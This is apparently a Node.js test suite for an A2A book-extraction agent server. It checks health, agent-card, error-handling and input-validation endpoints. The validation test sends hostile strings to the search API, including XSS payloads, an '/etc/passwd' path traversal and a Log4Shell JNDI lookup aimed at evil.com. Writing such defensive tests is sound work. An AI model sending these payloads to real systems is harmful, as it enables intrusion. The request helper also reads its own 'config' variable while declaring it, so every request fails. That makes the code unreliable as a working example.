#!/usr/bin/env node

/**
 * Basic Test Suite for A2A Book Agent (without API key requirements)
 * 
 * This script tests core functionality that doesn't require OpenAI API
 */

import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// Get __dirname equivalent in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Test results tracking
const testResults = {
  passed: 0,
  failed: 0,
  total: 0,
  details: []
};

// Test configuration
const config = {
  baseUrl: process.env.TEST_BASE_URL || 'http://localhost:4111',
  timeout: 10000,
  retries: 2
};

// Utility functions
function log(message, type = 'info') {
  const timestamp = new Date().toISOString();
  const prefix = {
    info: '📋',
    success: '✅',
    error: '❌',
    warning: '⚠️',
    progress: '🔄'
  }[type] || '📋';
  
  console.log(`${prefix} [${timestamp}] ${message}`);
}

function recordTest(name, passed, error = null) {
  testResults.total++;
  if (passed) {
    testResults.passed++;
    log(`PASSED: ${name}`, 'success');
  } else {
    testResults.failed++;
    log(`FAILED: ${name} - ${error}`, 'error');
  }
  
  testResults.details.push({
    name,
    passed,
    error,
    timestamp: new Date().toISOString()
  });
}

async function makeRequest(method, url, data = null, headers = {}) {
  try {
    const config = {
      method,
      url: `${config.baseUrl}${url}`,
      timeout: config.timeout,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'A2A-Book-Agent-Test/1.0.0',
        ...headers
      }
    };
    
    if (data) {
      config.data = data;
    }
    
    const response = await axios(config);
    return { success: true, data: response.data, status: response.status, headers: response.headers };
  } catch (error) {
    return {
      success: false,
      error: error.message,
      status: error.response?.status,
      data: error.response?.data
    };
  }
}

// Test functions
async function testServerHealth() {
  log('Testing server health...', 'progress');
  
  const result = await makeRequest('GET', '/health');
  
  if (result.success && result.status === 200) {
    const health = result.data;
    const isValid = health.status === 'healthy' && 
                   health.service === 'a2a-book-agent' &&
                   health.version &&
                   health.uptime !== undefined;
    
    recordTest('Server Health Check', isValid, 
               !isValid ? 'Invalid health response format' : null);
    return isValid;
  } else {
    recordTest('Server Health Check', false, result.error || 'Invalid status code');
    return false;
  }
}

async function testAgentCard() {
  log('Testing agent card endpoint...', 'progress');
  
  const result = await makeRequest('GET', '/.well-known/agent.json');
  
  if (result.success && result.status === 200) {
    const card = result.data;
    const isValid = card.name &&
                   card.description &&
                   card.version &&
                   card.capabilities &&
                   card.executionUrl &&
                   Array.isArray(card.skills) &&
                   card.skills.length > 0;
    
    recordTest('Agent Card Endpoint', isValid,
               !isValid ? 'Invalid agent card format' : null);
    return isValid;
  } else {
    recordTest('Agent Card Endpoint', false, result.error || 'Invalid status code');
    return false;
  }
}

async function testErrorHandling() {
  log('Testing error handling...', 'progress');
  
  const errorTests = [
    {
      name: 'Invalid Book Query',
      method: 'POST',
      url: '/api/extract-book',
      data: { searchQuery: '' },
      expectedStatus: 400
    },
    {
      name: 'Missing Search Query',
      method: 'POST',
      url: '/api/extract-book',
      data: {},
      expectedStatus: 400
    },
    {
      name: 'Invalid A2A Method',
      method: 'POST',
      url: '/a2a/book-extractor-001',
      data: {
        jsonrpc: '2.0',
        method: 'invalid/method',
        params: {},
        id: 'test_error_001'
      },
      expectedStatus: 200 // Should return error in JSON-RPC format
    },
    {
      name: 'Invalid Task ID',
      method: 'POST',
      url: '/a2a/book-extractor-001',
      data: {
        jsonrpc: '2.0',
        method: 'tasks/get',
        params: { id: 'invalid-task-id' },
        id: 'test_error_002'
      },
      expectedStatus: 200 // Should return error in JSON-RPC format
    },
    {
      name: 'Non-existent Endpoint',
      method: 'GET',
      url: '/non-existent-endpoint',
      data: null,
      expectedStatus: 404
    }
  ];
  
  let allPassed = true;
  
  for (const test of errorTests) {
    const result = await makeRequest(test.method, test.url, test.data);
    
    if (result.status === test.expectedStatus) {
      recordTest(`Error Handling - ${test.name}`, true);
    } else {
      recordTest(`Error Handling - ${test.name}`, false,
                 `Expected status ${test.expectedStatus}, got ${result.status}`);
      allPassed = false;
    }
  }
  
  return allPassed;
}

async function testInputValidation() {
  log('Testing input validation...', 'progress');
  
  const maliciousInputs = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    'onclick=alert("xss")',
    '../../etc/passwd',
    'SELECT * FROM users',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}',
    '<img src=x onerror=alert("xss")>'
  ];
  
  let allPassed = true;
  
  for (const input of maliciousInputs) {
    const result = await makeRequest('POST', '/api/extract-book', {
      searchQuery: input
    });
    
    // Should either reject input or sanitize it safely
    const isValid = result.status === 400 || 
                   (result.status === 500 && // Expected due to missing API key
                    result.data.error &&
                    !result.data.error.includes('<script>') &&
                    !result.data.error.includes('javascript:'));
    
    recordTest(`Input Validation - ${input.substring(0, 20)}...`, isValid,
               !isValid ? 'Malicious input not properly handled' : null);
    
    if (!isValid) allPassed = false;
  }
  
  return allPassed;
}

async function testWorkflowJSON() {
  log('Testing Telex workflow JSON...', 'progress');
  
  try {
    const workflowPath = path.join(__dirname, 'telex-workflow.json');
    const workflowData = JSON.parse(fs.readFileSync(workflowPath, 'utf8'));
    
    const isValid = workflowData.id &&
                   workflowData.name &&
                   workflowData.description &&
                   workflowData.type &&
                   workflowData.data &&
                   workflowData.data.agentId &&
                   workflowData.data.endpoint &&
                   Array.isArray(workflowData.inputs) &&
                   Array.isArray(workflowData.outputs);
    
    recordTest('Telex Workflow JSON', isValid,
               !isValid ? 'Invalid workflow JSON structure' : null);
    
    return isValid;
  } catch (error) {
    recordTest('Telex Workflow JSON', false, error.message);
    return false;
  }
}

async function testRateLimiting() {
  log('Testing rate limiting...', 'progress');
  
  // Make multiple rapid requests to test rate limiting
  const requests = [];
  for (let i = 0; i < 5; i++) {
    requests.push(makeRequest('GET', '/health'));
  }
  
  const results = await Promise.all(requests);
  const successCount = results.filter(r => r.success && r.status === 200).length;
  
  // All health requests should succeed
  const isValid = successCount === 5;
  
  recordTest('Rate Limiting (Health)', isValid,
             !isValid ? `Only ${successCount}/5 health requests succeeded` : null);
  
  return isValid;
}

async function testConcurrentRequests() {
  log('Testing concurrent requests...', 'progress');
  
  const concurrentRequests = 3;
  const requests = [];
  
  for (let i = 0; i < concurrentRequests; i++) {
    requests.push(makeRequest('GET', '/health'));
  }
  
  const results = await Promise.all(requests);
  const successCount = results.filter(r => r.success && r.status === 200).length;
  
  const isValid = successCount === concurrentRequests;
  
  recordTest('Concurrent Requests', isValid,
             !isValid ? `Only ${successCount}/${concurrentRequests} requests succeeded` : null);
  
  return isValid;
}

// Main test execution
async function runAllTests() {
  log('🚀 Starting A2A Book Agent Basic Test Suite', 'info');
  log(`Testing server at: ${config.baseUrl}`, 'info');
  log('='.repeat(60), 'info');
  
  const tests = [
    { name: 'Server Health', fn: testServerHealth },
    { name: 'Agent Card', fn: testAgentCard },
    { name: 'Error Handling', fn: testErrorHandling },
    { name: 'Input Validation', fn: testInputValidation },
    { name: 'Rate Limiting', fn: testRateLimiting },
    { name: 'Workflow JSON', fn: testWorkflowJSON },
    { name: 'Concurrent Requests', fn: testConcurrentRequests }
  ];
  
  for (const test of tests) {
    try {
      await test.fn();
    } catch (error) {
      recordTest(test.name, false, `Test execution error: ${error.message}`);
    }
    
    // Small delay between tests
    await new Promise(resolve => setTimeout(resolve, 300));
  }
  
  // Print final results
  log('='.repeat(60), 'info');
  log('📊 TEST RESULTS SUMMARY', 'info');
  log(`Total Tests: ${testResults.total}`, 'info');
  log(`Passed: ${testResults.passed}`, 'success');
  log(`Failed: ${testResults.failed}`, testResults.failed > 0 ? 'error' : 'info');
  log(`Success Rate: ${((testResults.passed / testResults.total) * 100).toFixed(1)}%`, 
      testResults.failed > 0 ? 'warning' : 'success');
  
  // Save detailed results to file
  const resultsPath = path.join(__dirname, `basic-test-results-${Date.now()}.json`);
  fs.writeFileSync(resultsPath, JSON.stringify(testResults, null, 2));
  log(`Detailed results saved to: ${resultsPath}`, 'info');
  
  // Exit with appropriate code
  process.exit(testResults.failed > 0 ? 1 : 0);
}

// Handle uncaught errors
process.on('uncaughtException', (error) => {
  log(`Uncaught Exception: ${error.message}`, 'error');
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  log(`Unhandled Rejection: ${reason}`, 'error');
  process.exit(1);
});

// Run tests if this script is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  runAllTests().catch(error => {
    log(`Test suite failed: ${error.message}`, 'error');
    process.exit(1);
  });
}

export {
  runAllTests,
  testServerHealth,
  testAgentCard,
  testErrorHandling,
  testInputValidation,
  testRateLimiting,
  testWorkflowJSON,
  testConcurrentRequests
};